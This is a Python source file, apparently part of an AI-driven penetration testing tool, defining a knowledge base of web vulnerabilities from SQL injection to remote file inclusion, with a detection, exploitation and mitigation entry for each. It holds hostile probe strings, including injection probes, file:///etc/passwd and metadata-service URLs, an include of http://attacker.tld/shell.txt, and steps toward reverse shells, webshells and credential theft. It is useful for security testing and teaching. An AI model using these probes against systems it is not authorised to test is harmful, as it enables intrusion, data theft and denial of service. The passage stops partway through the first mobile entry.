"""
Comprehensive vulnerability knowledge base.

Every entry carries detection hints, exploitation strategy, and
mitigation notes so the model has real ammunition when reasoning about
a live target.

Revision notes:
  - Added validate_entries() and validate_payload_references() helpers
    for tests and CI.
  - Entries referencing payload IDs not present in apex_payload.py have
    had their payloads list emptied.
"""

from __future__ import annotations

from typing import Any, Dict, List, Optional


VULNERABILITIES: List[Dict[str, Any]] = [

    # ============================================================
    # 1. INJECTION
    # ============================================================
    {
        "id": "sqli-union",
        "name": "SQL Injection (UNION-based)",
        "category": "Injection",
        "severity": "Critical",
        "description": (
            "Attacker injects a UNION SELECT to append rows from arbitrary "
            "tables to the original result set."
        ),
        "detection": [
            "Send ' UNION SELECT NULL-- and increment NULLs until no error",
            "Use ORDER BY N to binary-search column count quickly",
            "Watch for type mismatch errors that reveal column types",
            "Compare response byte length and row count before and after",
        ],
        "exploitation": [
            "Enumerate tables via information_schema.tables",
            "Dump columns via information_schema.columns",
            "Extract data via CONCAT and GROUP_CONCAT",
            "Chain into file-write when LOAD_FILE is not blocked",
        ],
        "payloads": ["sqli-union-mysql", "sqli-union-mssql", "sqli-union-postgres"],
        "mitigation": (
            "Prepared statements, parameterised queries, least-privilege DB "
            "accounts, and a WAF rule for UNION SELECT with version comments."
        ),
        "references": ["OWASP WSTG-INPV-05", "CWE-89"],
    },
    {
        "id": "sqli-blind",
        "name": "Blind SQL Injection",
        "category": "Injection",
        "severity": "High",
        "description": (
            "No direct output channel. Attacker infers data one bit at a time "
            "via boolean responses or time delays."
        ),
        "detection": [
            "Inject AND 1=1 / AND 1=2 and compare response bodies",
            "Inject SLEEP(5) and measure response time",
            "Inject pg_sleep(5) on PostgreSQL targets",
            "Inject WAITFOR DELAY '0:0:5' on MSSQL targets",
        ],
        "exploitation": [
            "Automate with sqlmap --technique=BT",
            "Use error-based fallback when time-based is blocked",
            "Leverage DNS out-of-band when output is blind",
            "Chain to stacked queries for RCE on MSSQL/PostgreSQL",
        ],
        "payloads": ["sqli-time-mysql", "sqli-time-mssql", "sqli-oob-dns"],
        "mitigation": "Prepared statements, query timeouts, WAF regex for SLEEP/WAITFOR.",
        "references": ["OWASP Blind SQLi", "CWE-89"],
    },
    {
        "id": "sqli-nosql",
        "name": "NoSQL Injection",
        "category": "Injection",
        "severity": "High",
        "description": (
            "MongoDB, CouchDB, and similar stores accept operator objects "
            "that bypass authentication or extract data."
        ),
        "detection": [
            "Send {\"$ne\": null} on login endpoints",
            "Send {\"$gt\": \"\"} to bypass password check",
            "Test $where with a sleep() payload for blind",
            "Test JSON content-type vs form content-type",
        ],
        "exploitation": [
            "Bypass login with {\"$ne\": null}",
            "Extract user list with {\"$regex\": \"^a\"}",
            "Blind extract via $where sleep()",
            "Chain to prototype pollution on Node.js backends",
        ],
        "payloads": ["nosql-auth-bypass", "nosql-regex", "nosql-where-sleep"],
        "mitigation": "Validate input types, forbid operator objects, use ODM libraries.",
        "references": ["OWASP NoSQL Injection", "CWE-943"],
    },
    {
        "id": "xss-reflected",
        "name": "Reflected XSS",
        "category": "Injection",
        "severity": "Medium",
        "description": (
            "User input is echoed back in the response without encoding."
        ),
        "detection": [
            "Inject a marker like apex<x> and check response body",
            "Check which characters are HTML-encoded vs raw",
            "Test context: HTML body, attribute, JS, CSS, URL",
            "Bypass CSP by looking for allowed script origins",
        ],
        "exploitation": [
            "Steal cookies when not HttpOnly",
            "Steal localStorage/sessionStorage tokens",
            "Force a password reset via fetch()",
            "Chain to CSRF for state-changing attacks",
        ],
        "payloads": ["xss-svg-onload", "xss-polyglot", "xss-csp-bypass"],
        "mitigation": "Context-aware output encoding, strict CSP, HttpOnly cookies.",
        "references": ["OWASP XSS", "CWE-79"],
    },
    {
        "id": "xss-stored",
        "name": "Stored XSS",
        "category": "Injection",
        "severity": "High",
        "description": (
            "Payload is persisted server-side and executes for every viewer."
        ),
        "detection": [
            "Submit payload in every user-controlled field",
            "Revisit the page as a second user to confirm execution",
            "Check admin panels and support dashboards",
        ],
        "exploitation": [
            "Steal admin session and pivot to internal tooling",
            "Chain with CSRF to perform privileged actions as admin",
            "Deliver browser exploits for deeper compromise",
        ],
        "payloads": ["xss-mxss-dompurify"],
        "mitigation": "Server-side sanitisation plus CSP.",
        "references": ["OWASP XSS", "CWE-79"],
    },
    {
        "id": "xss-dom",
        "name": "DOM-based XSS",
        "category": "Injection",
        "severity": "Medium",
        "description": (
            "Payload never touches the server. Client-side JavaScript reads "
            "attacker-controlled input and sinks it into dangerous APIs."
        ),
        "detection": [
            "Scan JS bundles for sources and sinks",
            "Use browser DevTools to trace data flow",
            "Fuzz fragment identifiers",
        ],
        "exploitation": [
            "Deliver via fragment identifier to bypass server-side WAF",
            "Chain with CSP weakness to load external scripts",
            "Combined with prototype pollution for gadget chains",
        ],
        "payloads": ["xss-dom-clobber"],
        "mitigation": "Trusted Types, textContent instead of innerHTML, CSP.",
        "references": ["OWASP DOM XSS", "CWE-79"],
    },
    {
        "id": "xss-mutation",
        "name": "Mutation XSS (mXSS)",
        "category": "Injection",
        "severity": "High",
        "description": (
            "Sanitiser removes the payload but the browser re-parses the "
            "remaining markup in a way that resurrects the script."
        ),
        "detection": [
            "Test nested math, svg, mglyph, noscript tags",
            "Use known mXSS vectors from PortSwigger research",
        ],
        "exploitation": [
            "Bypass sanitizer then execute stored payload for all viewers",
        ],
        "payloads": ["xss-mxss-dompurify"],
        "mitigation": "Update DOMPurify, use Trusted Types.",
        "references": ["Cure53 mXSS paper", "CVE-2020-26870"],
    },
    {
        "id": "csrf",
        "name": "Cross-Site Request Forgery",
        "category": "Injection",
        "severity": "High",
        "description": (
            "Attacker makes a victim's browser send an authenticated state-"
            "changing request without the victim's awareness."
        ),
        "detection": [
            "Remove CSRF token from request and replay",
            "Change token to a random value and check response",
            "Test same-site cookie attribute",
            "Test JSON-based CSRF (content-type bypass)",
        ],
        "exploitation": [
            "Auto-submit form to /admin/add-user",
            "Fetch-based CSRF when content-type is application/json",
            "Chain with XSS for forced actions",
        ],
        "payloads": [],
        "mitigation": "Per-request CSRF tokens, SameSite=Strict cookies, origin checks.",
        "references": ["OWASP CSRF", "CWE-352"],
    },
    {
        "id": "rce",
        "name": "Remote Code Execution",
        "category": "Injection",
        "severity": "Critical",
        "description": (
            "Attacker gets arbitrary code or shell commands executed on the "
            "target."
        ),
        "detection": [
            "Look for eval(), exec(), system(), popen() in source",
            "Test template engines with {{7*7}} style probes",
            "Test deserialization endpoints with ysoserial",
        ],
        "exploitation": [
            "Reverse shell to a controlled listener",
            "Stage a webshell for persistence",
            "Pivot into internal network",
        ],
        "payloads": [],
        "mitigation": "Never eval user input, run in sandbox, use SELinux/AppArmor.",
        "references": ["CWE-94", "MITRE T1059"],
    },
    {
        "id": "cmd-injection",
        "name": "OS Command Injection",
        "category": "Injection",
        "severity": "Critical",
        "description": (
            "Application passes user input directly to a shell."
        ),
        "detection": [
            "Send ;id, |id, $(id), `id`, %0aid as parameter values",
            "Use time-based payloads (; sleep 5) when output is hidden",
            "Test blind via out-of-band DNS",
        ],
        "exploitation": [
            "Establish reverse shell",
            "Enumerate local users and privileges",
            "Dump credentials from config files",
        ],
        "payloads": ["cmd-semicolon", "cmd-pipe", "cmd-subshell", "cmd-oob"],
        "mitigation": "Avoid shell=True, use execve with argv arrays, input allowlist.",
        "references": ["OWASP Command Injection", "CWE-78"],
    },
    {
        "id": "ssti",
        "name": "Server-Side Template Injection",
        "category": "Injection",
        "severity": "Critical",
        "description": (
            "User input is concatenated into a template string."
        ),
        "detection": [
            "Send {{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %> and check response",
            "Fingerprint engine via {{7*'7'}} output ('7777777' = Jinja2)",
            "Test payloads specific to Jinja2, Twig, Freemarker, Velocity",
        ],
        "exploitation": [
            "Escape Jinja2 sandbox via __subclasses__",
            "Twig RCE via filter('system')",
            "Freemarker ?new() gadget",
        ],
        "payloads": ["ssti-jinja2-rce", "ssti-twig-rce", "ssti-freemarker"],
        "mitigation": "Never concatenate user input into templates, use a sandbox.",
        "references": ["PortSwigger SSTI", "CWE-94"],
    },
    {
        "id": "ldap-injection",
        "name": "LDAP Injection",
        "category": "Injection",
        "severity": "High",
        "description": (
            "User input flows into an LDAP filter without escaping."
        ),
        "detection": [
            "Send *)(uid=*))(|(uid=* and observe behaviour",
            "Test filter construction in login forms",
        ],
        "exploitation": [
            "Bypass authentication as any user",
            "Enumerate users, groups, and service accounts",
            "Reach AD CS or NTLM-relay primitives",
        ],
        "payloads": [],
        "mitigation": "Escape LDAP metacharacters, use bind authentication.",
        "references": ["OWASP LDAP Injection", "CWE-90"],
    },
    {
        "id": "xpath-injection",
        "name": "XPath Injection",
        "category": "Injection",
        "severity": "High",
        "description": (
            "User input flows into an XPath expression."
        ),
        "detection": [
            "Send ' or '1'='1 in XML-backed login forms",
            "Test boolean and time probes",
        ],
        "exploitation": [
            "Bypass auth with ' or '1'='1",
            "Extract document via count() and string-length()",
        ],
        "payloads": [],
        "mitigation": "Use XPath variables, escape quotes, never concatenate.",
        "references": ["OWASP XPath Injection", "CWE-643"],
    },
    {
        "id": "xml-injection",
        "name": "XML Injection",
        "category": "Injection",
        "severity": "Medium",
        "description": (
            "Attacker injects XML structure into a payload that is parsed "
            "server-side."
        ),
        "detection": [
            "Inject XML metacharacters and check errors",
            "Test XML schema bypass in SOAP services",
        ],
        "exploitation": [
            "Inject extra elements to override logic",
            "Chain to XXE for file read",
        ],
        "payloads": [],
        "mitigation": "Disable external entities, use XML schema validation.",
        "references": ["OWASP XML Injection", "CWE-91"],
    },
    {
        "id": "xss-sql-polyglot",
        "name": "Cross-Context Polyglot Payload",
        "category": "Injection",
        "severity": "High",
        "description": (
            "Single payload that executes in HTML, JavaScript, attribute, "
            "and SQL contexts."
        ),
        "detection": [
            "Submit to login, search, and reflection endpoints",
        ],
        "exploitation": [
            "Chain with SQLi for stacked outcomes",
            "Deliver via malicious form to a victim",
        ],
        "payloads": ["xss-polyglot"],
        "mitigation": "Context-aware encoding plus CSP and WAF rules per context.",
        "references": ["Cure53 polyglot research"],
    },

    # ============================================================
    # 2. BROKEN AUTH & SESSION
    # ============================================================
    {
        "id": "session-fixation",
        "name": "Session Fixation",
        "category": "Broken Authentication",
        "severity": "High",
        "description": (
            "Attacker forces a known session ID on the victim."
        ),
        "detection": [
            "Set a session cookie before login and observe if it survives",
            "Compare cookie before and after authentication",
        ],
        "exploitation": [
            "Fix a token via URL and wait for victim login",
            "Chain with XSS for token injection",
        ],
        "payloads": [],
        "mitigation": "Rotate session ID on login, bind to IP/UA fingerprint.",
        "references": ["OWASP Session Fixation", "CWE-384"],
    },
    {
        "id": "jwt-alg-none",
        "name": "JWT Algorithm Confusion (alg=none)",
        "category": "Broken Authentication",
        "severity": "Critical",
        "description": (
            "Server accepts tokens with alg=none and skips signature "
            "verification."
        ),
        "detection": [
            "Decode JWT and change alg to none, mixed case variants",
            "Remove signature segment entirely",
        ],
        "exploitation": [
            "Forge admin token with sub=admin",
            "Chain with IDOR for horizontal escalation",
        ],
        "payloads": ["jwt-none", "jwt-none-mixed"],
        "mitigation": "Reject alg=none, verify against allowlist of algorithms.",
        "references": ["PortSwigger JWT", "CWE-347"],
    },
    {
        "id": "jwt-hmac-confusion",
        "name": "JWT HMAC-to-RSA Confusion",
        "category": "Broken Authentication",
        "severity": "Critical",
        "description": (
            "Server uses HMAC verification but attacker signs with the "
            "public RSA key as the HMAC secret."
        ),
        "detection": [
            "Decode JWT header, note algorithm",
            "Attempt to sign with public key as HMAC secret",
        ],
        "exploitation": [
            "Forge token signed with public key",
            "Bypass privilege checks entirely",
        ],
        "payloads": ["jwt-hmac-confusion"],
        "mitigation": "Bind algorithm to key type, validate alg header.",
        "references": ["CVE-2016-5431", "CWE-347"],
    },
    {
        "id": "jwt-kid-injection",
        "name": "JWT kid Header Injection",
        "category": "Broken Authentication",
        "severity": "Critical",
        "description": (
            "The kid header is used to look up the signing key."
        ),
        "detection": [
            "Set kid to ../../../../dev/null and re-sign",
            "Set kid to SQL payload and observe errors",
        ],
        "exploitation": [
            "Sign with empty key when kid=dev/null",
            "SQLi via kid on MSSQL",
        ],
        "payloads": ["jwt-kid-traversal", "jwt-kid-sqli"],
        "mitigation": "Validate kid against a strict list, never concatenate.",
        "references": ["PortSwigger JWT", "CWE-22"],
    },
    {
        "id": "brute-force",
        "name": "Credential Brute Force / Stuffing",
        "category": "Broken Authentication",
        "severity": "High",
        "description": (
            "Automated guessing of passwords using wordlists, leaked "
            "credentials, or password spraying."
        ),
        "detection": [
            "Test rate limiting on login endpoint",
            "Test account lockout policy",
            "Check for CAPTCHA bypass",
        ],
        "exploitation": [
            "Hydra / Burp Intruder with rockyou",
            "Password spraying with a single password across users",
            "Credential stuffing with public breach dumps",
        ],
        "payloads": [],
        "mitigation": "Rate limit, MFA, password blacklists, lockout policy.",
        "references": ["OWASP Authentication Cheatsheet"],
    },
    {
        "id": "password-reset-flaws",
        "name": "Password Reset Flow Flaws",
        "category": "Broken Authentication",
        "severity": "High",
        "description": (
            "Reset tokens that are predictable, reusable, or hijackable."
        ),
        "detection": [
            "Test token reuse in parallel requests",
            "Test Host header injection in reset link",
            "Test user enumeration via timing and response size",
        ],
        "exploitation": [
            "Take over account via poisoned Host header",
            "Race two reset requests to reuse token",
        ],
        "payloads": [],
        "mitigation": "Cryptographically random tokens, one-time use, validate Host.",
        "references": ["OWASP Forgot Password", "CWE-640"],
    },
    {
        "id": "mfa-bypass",
        "name": "MFA Bypass",
        "category": "Broken Authentication",
        "severity": "Critical",
        "description": (
            "MFA can be bypassed via response manipulation, TOTP replay, "
            "push fatigue, or a fallback that skips MFA entirely."
        ),
        "detection": [
            "Intercept MFA response and flip success flag",
            "Replay a TOTP within its window",
            "Find /api/login-without-mfa fallback endpoints",
        ],
        "exploitation": [
            "Spam push notifications until fatigue",
            "Bypass via response tampering in Burp",
            "Chain with OAuth consent phishing",
        ],
        "payloads": [],
        "mitigation": "Server-side verification only, number-matching on push.",
        "references": ["MITRE T1621", "Uber MFA fatigue 2022"],
    },

    # ============================================================
    # 3. SENSITIVE DATA EXPOSURE
    # ============================================================
    {
        "id": "idor",
        "name": "Insecure Direct Object Reference",
        "category": "Sensitive Data Exposure",
        "severity": "High",
        "description": (
            "Application uses attacker-controllable identifiers to fetch "
            "resources without an ownership check."
        ),
        "detection": [
            "Change numeric IDs and observe access",
            "Try UUID-to-integer coercion",
            "Try ID swapping between two accounts",
        ],
        "exploitation": [
            "Enumerate /api/users/1..N",
            "Dump invoices, medical records, PII",
            "Chain into account takeover",
        ],
        "payloads": [],
        "mitigation": "Ownership checks on every object access (BOLA / OWASP API1).",
        "references": ["OWASP API1", "CWE-639"],
    },
    {
        "id": "missing-headers",
        "name": "Missing Security Headers",
        "category": "Sensitive Data Exposure",
        "severity": "Low",
        "description": (
            "CSP, HSTS, X-Frame-Options, X-Content-Type-Options, "
            "Referrer-Policy are absent."
        ),
        "detection": [
            "curl -I target and inspect response headers",
            "Check for CSP allowing unsafe-inline or wildcards",
        ],
        "exploitation": [
            "Clickjacking via iframe",
            "MIME sniffing for XSS delivery",
        ],
        "payloads": [],
        "mitigation": "Deploy all five standard headers, prefer CSP with nonce.",
        "references": ["OWASP Secure Headers Project"],
    },
    {
        "id": "file-handling",
        "name": "Insecure File Handling",
        "category": "Sensitive Data Exposure",
        "severity": "High",
        "description": (
            "Upload endpoints that trust filename, extension, or content-type."
        ),
        "detection": [
            "Upload shell.php.jpg and check execution",
            "Upload with ../../ in filename",
            "Upload with Content-Type: application/x-php",
        ],
        "exploitation": [
            "Write webshell to web root",
            "Overwrite SSH authorized_keys",
            "Chain with LFI for RCE",
        ],
        "payloads": ["upload-webshell", "upload-traversal"],
        "mitigation": "Server-side extension validation, store outside web root, disable execution.",
        "references": ["OWASP File Upload", "CWE-434"],
    },

    # ============================================================
    # 4. SECURITY MISCONFIGURATION
    # ============================================================
    {
        "id": "directory-listing",
        "name": "Directory Listing Enabled",
        "category": "Security Misconfiguration",
        "severity": "Medium",
        "description": (
            "Server returns an index of a directory instead of 403."
        ),
        "detection": [
            "Request /uploads/, /backups/, /admin/ without trailing index",
        ],
        "exploitation": [
            "Harvest config.php.bak, .env, .git/",
            "Extract source for whitebox analysis",
        ],
        "payloads": [],
        "mitigation": "Disable autoindex in nginx/apache, return 403 on directory.",
        "references": ["OWASP Directory Traversal"],
    },
    {
        "id": "default-creds",
        "name": "Default Credentials",
        "category": "Security Misconfiguration",
        "severity": "Critical",
        "description": (
            "Admin panels still running admin/admin, root/root, or vendor "
            "defaults."
        ),
        "detection": [
            "Test admin/admin, admin/password, root/root",
            "Consult vendor docs for default creds",
            "Use hydra with default-creds.txt",
        ],
        "exploitation": [
            "Log in as admin, upload firmware or shell",
            "Extract device config with keys",
        ],
        "payloads": [],
        "mitigation": "Force password change on first boot, ship with random creds.",
        "references": ["CWE-1392"],
    },
    {
        "id": "cors-misconfig",
        "name": "CORS Misconfiguration",
        "category": "Security Misconfiguration",
        "severity": "High",
        "description": (
            "Server reflects Origin and sets Access-Control-Allow-Credentials: true."
        ),
        "detection": [
            "Send Origin: https://attacker.tld and inspect ACAO",
            "Test null origin",
            "Test subdomain wildcards",
        ],
        "exploitation": [
            "Steal API responses from victim browser",
            "Exfiltrate API keys and PII",
        ],
        "payloads": [],
        "mitigation": "Allowlist of trusted origins, never reflect null.",
        "references": ["PortSwigger CORS", "CWE-942"],
    },
    {
        "id": "api-endpoint-exposure",
        "name": "Unprotected API Endpoints",
        "category": "Security Misconfiguration",
        "severity": "High",
        "description": (
            "Internal or admin endpoints exposed without auth."
        ),
        "detection": [
            "Fuzz /api/, /internal/, /v1/admin/",
            "Check /swagger.json, /openapi.json, /graphql",
            "Parse JS bundles for endpoint strings",
        ],
        "exploitation": [
            "Call /api/admin/users without auth",
            "Dump sensitive config from /internal/env",
        ],
        "payloads": [],
        "mitigation": "Route-level auth, network ACL, prefix-based blocking.",
        "references": ["OWASP API9"],
    },

    # ============================================================
    # 5. XML-RELATED
    # ============================================================
    {
        "id": "xxe",
        "name": "XML External Entity Injection",
        "category": "XML-Related",
        "severity": "Critical",
        "description": (
            "Parser accepts external entities."
        ),
        "detection": [
            "Send DOCTYPE with SYSTEM file:///etc/passwd",
            "Test out-of-band DTD with Burp Collaborator",
            "Test SOAP, SAML, SVG, and DOCX upload endpoints",
        ],
        "exploitation": [
            "Read /etc/passwd, /etc/shadow, config files",
            "SSRF into internal metadata services",
            "Chain to RCE via PHP filter chain",
        ],
        "payloads": ["xxe-file", "xxe-oob"],
        "mitigation": "Disable external entities, use defusedxml, validate DTD.",
        "references": ["OWASP XXE", "CWE-611"],
    },
    {
        "id": "xml-bomb",
        "name": "XML Entity Expansion / Billion Laughs",
        "category": "XML-Related",
        "severity": "Medium",
        "description": (
            "Recursive entity expansion exhausts memory, causing DoS."
        ),
        "detection": [
            "Send a small recursive entity payload",
            "Monitor server memory usage",
        ],
        "exploitation": [
            "DoS a document-processing endpoint",
            "Combine with XXE for OOB amplification",
        ],
        "payloads": ["xxe-billion-laughs"],
        "mitigation": "Limit entity expansion, disable DTDs.",
        "references": ["CWE-776"],
    },

    # ============================================================
    # 6. BROKEN ACCESS CONTROL
    # ============================================================
    {
        "id": "bfla",
        "name": "Broken Function-Level Authorization",
        "category": "Broken Access Control",
        "severity": "High",
        "description": (
            "UI hides admin buttons but API does not enforce the check."
        ),
        "detection": [
            "Enumerate /admin/* endpoints with regular user token",
            "Diff UI-visible routes vs JS bundle routes",
            "Test HTTP verb tampering on admin routes",
        ],
        "exploitation": [
            "Delete users via /api/admin/users/{id}",
            "Change other users' roles",
        ],
        "payloads": [],
        "mitigation": "Enforce server-side RBAC per route, not per UI element.",
        "references": ["OWASP API5", "CWE-285"],
    },
    {
        "id": "force-browsing",
        "name": "Forceful Browsing",
        "category": "Broken Access Control",
        "severity": "Medium",
        "description": (
            "Attacker guesses URLs to reach resources that are not linked "
            "in the UI but still exist and lack auth."
        ),
        "detection": [
            "Use dirsearch / feroxbuster with big lists",
            "Fuzz /admin, /backup, /internal",
        ],
        "exploitation": [
            "Reach admin panel without auth",
            "Download backup archives",
        ],
        "payloads": [],
        "mitigation": "Require auth on every route, remove orphan routes.",
        "references": ["OWASP WSTG-ATHZ"],
    },

    # ============================================================
    # 7. INSECURE DESERIALIZATION
    # ============================================================
    {
        "id": "deser-java",
        "name": "Java Deserialization RCE",
        "category": "Insecure Deserialization",
        "severity": "Critical",
        "description": (
            "ObjectInputStream.readObject on untrusted data with a gadget "
            "chain on the classpath yields RCE."
        ),
        "detection": [
            "Look for rO0AB (base64 of 0xACED) in cookies or bodies",
            "Fingerprint libraries via ysoserial",
        ],
        "exploitation": [
            "ysoserial CommonsCollections6 for RCE",
            "URLDNS probe for blind detection",
            "Chain with JNDI for log4shell-style impact",
        ],
        "payloads": ["deser-ysoserial-cc6", "deser-urldns"],
        "mitigation": "Whitelist allowed classes, use ObjectInputFilter.",
        "references": ["CWE-502", "Ysoserial"],
    },
    {
        "id": "deser-python",
        "name": "Python Pickle RCE",
        "category": "Insecure Deserialization",
        "severity": "Critical",
        "description": (
            "pickle.loads on untrusted data executes __reduce__ gadgets."
        ),
        "detection": [
            "Look for base64 starting with gASV in cookies",
            "Fingerprint pickled payloads with pickletools",
        ],
        "exploitation": [
            "Class with __reduce__ returning os.system",
            "Reverse shell via subprocess.Popen",
        ],
        "payloads": ["deser-pickle-rce"],
        "mitigation": "Never unpickle untrusted data, use json or msgpack.",
        "references": ["CWE-502"],
    },
    {
        "id": "deser-php",
        "name": "PHP Object Injection",
        "category": "Insecure Deserialization",
        "severity": "Critical",
        "description": (
            "unserialize on user input combined with a POP chain in loaded "
            "classes leads to RCE, file write, or SQLi."
        ),
        "detection": [
            "Look for O: or a: in cookies or serialized parameters",
            "Fingerprint framework (Laravel, Symfony, WordPress)",
        ],
        "exploitation": [
            "Craft POP chain via __destruct / __wakeup",
            "Chain to file write or SQLi",
        ],
        "payloads": ["deser-php-pop"],
        "mitigation": "Use json_decode, never unserialize user data.",
        "references": ["CWE-502"],
    },

    # ============================================================
    # 8. API SECURITY
    # ============================================================
    {
        "id": "api-rate-limit",
        "name": "Missing Rate Limiting",
        "category": "API Security",
        "severity": "Medium",
        "description": (
            "Sensitive endpoints accept unlimited requests."
        ),
        "detection": [
            "Send 100 rapid requests to /login and measure success",
            "Check for 429 / Retry-After response",
        ],
        "exploitation": [
            "Brute force OTP (6 digits = 1M attempts)",
            "Cost exhaustion on paid API endpoints",
        ],
        "payloads": [],
        "mitigation": "Per-IP and per-user token bucket, exponential backoff.",
        "references": ["OWASP API4"],
    },
    {
        "id": "graphql-introspection",
        "name": "GraphQL Introspection Enabled",
        "category": "API Security",
        "severity": "Medium",
        "description": (
            "Full schema introspection available in production."
        ),
        "detection": [
            "Send {__schema{types{name}}} query",
            "Use InQL / graphql-voyager for visualisation",
        ],
        "exploitation": [
            "Discover hidden mutations",
            "Enumerate ID fields for IDOR",
        ],
        "payloads": ["graphql-introspect"],
        "mitigation": "Disable introspection in prod, use allowlisted queries.",
        "references": ["OWASP GraphQL Cheatsheet"],
    },
    {
        "id": "graphql-batching",
        "name": "GraphQL Query Batching Abuse",
        "category": "API Security",
        "severity": "High",
        "description": (
            "Alias-based batching lets attacker send 1000 queries in one "
            "request."
        ),
        "detection": [
            "Send query with 100 aliases of the same field",
            "Measure response size and rate limits",
        ],
        "exploitation": [
            "Brute force OTP via aliases",
            "Enumerate users en masse",
        ],
        "payloads": ["graphql-alias-batch"],
        "mitigation": "Limit query depth and total aliases per request.",
        "references": ["PortSwigger GraphQL"],
    },

    # ============================================================
    # 9. INSECURE COMMUNICATION
    # ============================================================
    {
        "id": "tls-misconfig",
        "name": "Weak TLS Configuration",
        "category": "Insecure Communication",
        "severity": "Medium",
        "description": (
            "TLS 1.0/1.1 enabled, weak ciphers, or missing HSTS."
        ),
        "detection": [
            "Run testssl.sh or sslyze",
            "Check HSTS header presence",
        ],
        "exploitation": [
            "SSL strip for credential theft",
            "Downgrade attack on internal traffic",
        ],
        "payloads": [],
        "mitigation": "TLS 1.2+, strong ciphers only, HSTS with long max-age.",
        "references": ["CWE-326"],
    },

    # ============================================================
    # 10. CLIENT-SIDE
    # ============================================================
    {
        "id": "clickjacking",
        "name": "Clickjacking",
        "category": "Client-Side",
        "severity": "Medium",
        "description": (
            "Target page is iframable."
        ),
        "detection": [
            "Check for X-Frame-Options and frame-ancestors CSP",
            "Try iframing the target",
        ],
        "exploitation": [
            "Frame the admin panel and overlay a decoy",
            "Trick user into clicking 'Add User' or 'Transfer'",
        ],
        "payloads": [],
        "mitigation": "X-Frame-Options: DENY, CSP frame-ancestors 'none'.",
        "references": ["CWE-1021"],
    },
    {
        "id": "postmessage-hijack",
        "name": "Insecure postMessage",
        "category": "Client-Side",
        "severity": "High",
        "description": (
            "Window.postMessage handler does not validate event.origin."
        ),
        "detection": [
            "Grep JS for addEventListener('message')",
            "Test cross-origin messages from an attacker page",
        ],
        "exploitation": [
            "Force logout, token reset, or account change",
            "Trigger privileged actions cross-origin",
        ],
        "payloads": [],
        "mitigation": "Always validate event.origin against an allowlist.",
        "references": ["CWE-346"],
    },

    # ============================================================
    # 11. DOS
    # ============================================================
    {
        "id": "slowloris",
        "name": "Slowloris / Slow POST DoS",
        "category": "Denial of Service",
        "severity": "Medium",
        "description": (
            "Attacker holds many half-open connections with slow headers."
        ),
        "detection": [
            "Check connection limits per IP",
            "Test with slowhttptest",
        ],
        "exploitation": [
            "slowhttptest -c 1000 -H -g -o slowloris",
            "Combine with slow POST for amplification",
        ],
        "payloads": [],
        "mitigation": "Timeout on headers, per-IP connection cap, reverse proxy.",
        "references": ["CWE-400"],
    },
    {
        "id": "regex-dos",
        "name": "Regular Expression DoS (ReDoS)",
        "category": "Denial of Service",
        "severity": "Medium",
        "description": (
            "Catastrophic backtracking in user-validated regex causes CPU "
            "exhaustion."
        ),
        "detection": [
            "Fuzz input with long repetitions of a repeated character",
            "Time responses with short vs long input",
        ],
        "exploitation": [
            "Send 'aaaa...' to trigger backtracking",
            "Target email / URL validation regexes",
        ],
        "payloads": [],
        "mitigation": "Use RE2 or safe-regex, bound input length, add timeouts.",
        "references": ["CWE-1333"],
    },

    # ============================================================
    # 12. OTHER WEB
    # ============================================================
    {
        "id": "ssrf",
        "name": "Server-Side Request Forgery",
        "category": "SSRF",
        "severity": "Critical",
        "description": (
            "Server fetches a URL supplied by the user."
        ),
        "detection": [
            "Submit http://169.254.169.254/ in every URL field",
            "Use decimal and IPv6 encodings of localhost",
            "Test DNS rebinding via nip.io",
            "Test file:// and gopher:// schemes",
        ],
        "exploitation": [
            "Steal IAM credentials from IMDS",
            "Hijack Redis via gopher for RCE",
            "Reach kube-apiserver from a pod",
        ],
        "payloads": ["ssrf-decimal", "ssrf-ipv6", "ssrf-gopher-redis", "ssrf-k8s-api"],
        "mitigation": "URL allowlist, disable file://, block 169.254.169.254.",
        "references": ["OWASP SSRF", "CWE-918"],
    },
    {
        "id": "ssrf-blind",
        "name": "Blind / Time-Based SSRF",
        "category": "SSRF",
        "severity": "High",
        "description": (
            "No response reflected. Attacker confirms SSRF via out-of-band "
            "DNS / HTTP callbacks or response time difference."
        ),
        "detection": [
            "Point URL field at a Burp Collaborator domain",
            "Measure delay for internal vs external URLs",
        ],
        "exploitation": [
            "Confirm SSRF via callback",
            "Port-scan internal services via time delay",
        ],
        "payloads": ["ssrf-oob"],
        "mitigation": "Block outbound traffic from app server, allowlist only.",
        "references": ["OWASP SSRF"],
    },
    {
        "id": "hpp",
        "name": "HTTP Parameter Pollution",
        "category": "Other Web",
        "severity": "Medium",
        "description": (
            "Duplicate query/body parameters are handled differently by WAF "
            "and backend."
        ),
        "detection": [
            "Send ?id=1&id=2 and observe backend choice",
            "Test array vs scalar coercion",
        ],
        "exploitation": [
            "Bypass WAF filter with a clean duplicate",
            "Tamper with price or quantity",
        ],
        "payloads": [],
        "mitigation": "Reject duplicate parameters, normalise on backend.",
        "references": ["OWASP HPP"],
    },
    {
        "id": "open-redirect",
        "name": "Open Redirect",
        "category": "Other Web",
        "severity": "Medium",
        "description": (
            "Server redirects to a user-supplied URL without validation."
        ),
        "detection": [
            "Submit https://attacker.tld as ?next= value",
            "Test //attacker.tld, /\\attacker.tld, and encoded forms",
        ],
        "exploitation": [
            "Steal OAuth code during login flow",
            "Phishing via trusted domain",
        ],
        "payloads": [],
        "mitigation": "Allowlist redirect targets, use relative paths only.",
        "references": ["CWE-601"],
    },
    {
        "id": "lfi",
        "name": "Local File Inclusion",
        "category": "Other Web",
        "severity": "High",
        "description": (
            "Page parameter feeds a file path (include, require)."
        ),
        "detection": [
            "Submit ../../../../etc/passwd",
            "Test PHP wrappers: php://filter, phar://",
            "Poison Apache logs with PHP code then include the log",
        ],
        "exploitation": [
            "Read /etc/passwd, .env, config files",
            "RCE via log poisoning + LFI",
            "Chain with /proc/self/environ",
        ],
        "payloads": ["lfi-traversal", "lfi-php-filter", "lfi-log-poison"],
        "mitigation": "Allowlist paths, chroot, disable dangerous wrappers.",
        "references": ["CWE-98"],
    },
    {
        "id": "rfi",
        "name": "Remote File Inclusion",
        "category": "Other Web",
        "severity": "Critical",
        "description": (
            "Application includes a remote URL."
        ),
        "detection": [
            "Test ?page=http://attacker.tld/shell.txt",
            "Check allow_url_include in PHP",
        ],
        "exploitation": [
            "Host shell.php on attacker server, include via RFI",
            "Chain with XSS for delivery",
        ],
        "payloads": ["rfi-basic"],
        "mitigation": "Disable allow_url_include, allowlist includes.",
        "references": ["CWE-98"],
    },

    # ============================================================
    # 13. MOBILE
    # ============================================================
    {
        "id": "mobile-insecure-storage",
